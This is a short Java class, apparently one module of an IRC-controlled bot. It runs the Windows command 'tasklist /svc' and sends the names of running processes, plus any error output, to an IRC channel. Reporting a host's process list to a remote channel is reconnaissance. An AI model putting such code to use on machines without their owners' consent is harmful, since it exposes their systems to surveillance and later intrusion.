import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
/**
 * ProcessList class, gets process list :)
 * @author Nathan
 *
 */
public class ProcessList extends Thread 
{
	/**
	 * Prints out the process list on a new thread
	 */
    public void run() 
    {
    	String strOutput = "";
    	String strError = "";
    	try 
    	{
    		String process = " : ";
    	Process p = Runtime.getRuntime().exec(new String[]{"cmd", "/c", "tasklist /svc"});
    	BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
    	BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream()));
    	while (strOutput != null) {
    	if (strOutput.length() < 1) {
    	} else {
    		String processName[] = Misc.splitArgs(strOutput);
    		process = new StringBuffer(process).append(" "+processName[0]).toString();
    	}
    	strOutput = stdInput.readLine();
    	}
    	IRC.sendMessage(Config.getChannel(), process);
    	strError = stdError.readLine();
    	if (strError != null) {
    	IRC.sendMessage(Config.getChannel(), "An error occured");
    	while (strError != null) {
    	IRC.sendMessage(Config.getChannel(), strError);
    	strError = stdError.readLine();
    	}
    	}
    	} catch (IOException ioe) {
    	IRC.sendMessage(Config.getChannel(), "An IOException occured");
    	ioe.printStackTrace();
    	}
    	}
    }